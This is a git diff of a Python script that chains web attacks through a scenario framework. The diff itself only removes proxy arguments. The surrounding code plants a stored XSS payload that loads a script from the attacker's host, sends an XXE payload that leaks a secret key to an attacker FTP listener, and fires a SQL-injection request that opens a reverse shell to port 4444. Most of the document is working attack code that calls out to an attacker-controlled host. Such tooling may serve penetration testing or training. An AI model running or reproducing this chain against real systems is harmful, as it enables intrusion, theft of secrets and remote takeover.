@@ -19,7 +19,6 @@ async def plant_xss(scenario):
         'http://{rhost}:{rport}/test/'.format(**scenario.context),
         'field=<script src=http://{lhost}:{lport_http}/xss.js></script>'.format(**scenario.context),
         scenario.context['post_headers'],
-        scenario.context['proxy']
     )
 
 
@@ -28,8 +27,7 @@ async def get_new_account(scenario):
 
     """
     result = await scenario.http_get(
-        'http://{rhost}:{rport}/userid/{username}'.format(**scenario.context),
-        scenario.context['proxy']
+        'http://{rhost}:{rport}/userid/{username}'.format(**scenario.context)
     )
     scenario.context['userid'] = result
 
@@ -42,7 +40,6 @@ async def send_xxe(scenario):
         'http://{rhost}:{rport}/xml-import/'.format(**scenario.context),
         '<?xml version="1.0" ?><something evil="{userid}">ftp://{lhost}:{lport_ftp}</something>'.format(**scenario.context),
         scenario.context['post_headers'],
-        scenario.context['proxy']
     )
 
 
@@ -54,7 +51,6 @@ async def reverse_shell(scenario):
         'http://{rhost}:{rport}/query/'.format(**scenario.context),
         'secret={secret}&query=DROP+TABLE+IF+EXISTS+[...]{lhost}+{lport_reverse}'.format(**scenario.context),
         scenario.context['post_headers'],
-        scenario.context['proxy']
     )
 
 
@@ -71,12 +67,11 @@ if __name__ == "__main__":
         'lport_reverse': 4444,
         'lport_ftp': 2121,
         'username': 'evil',
-        'proxy': '',
-        # 'proxy': 'http': 'http://127.0.0.1:8080',  # In case you'd like to watch it live
         'post_headers': {'Content-Type': 'application/x-www-form-urlencoded'},
     }
 
     story = scenarios.Scenario(**context)
+    # story.set_proxy('http://127.0.0.1:8080')  # In case you'd like to watch it live
 
     httpd = services.HTTPStatic(story)
     httpd.add_route('/', 'This is home page...')
@@ -87,10 +82,10 @@ if __name__ == "__main__":
     ftpd = services.FTPReader(story)
     ftpd.set_event('xxe', when=triggers.DataMatch(r'.+SecretKey=(.+);', bucket='secret'))
 
-    # story.debug()
     story.add_scene(plant_xss)
     story.add_scene(get_new_account, when='xss')
     story.add_scene(send_xxe)
     story.add_scene(reverse_shell, when='xxe')
     story.add_scene(done)
+    # story.set_debug()
     story.play()
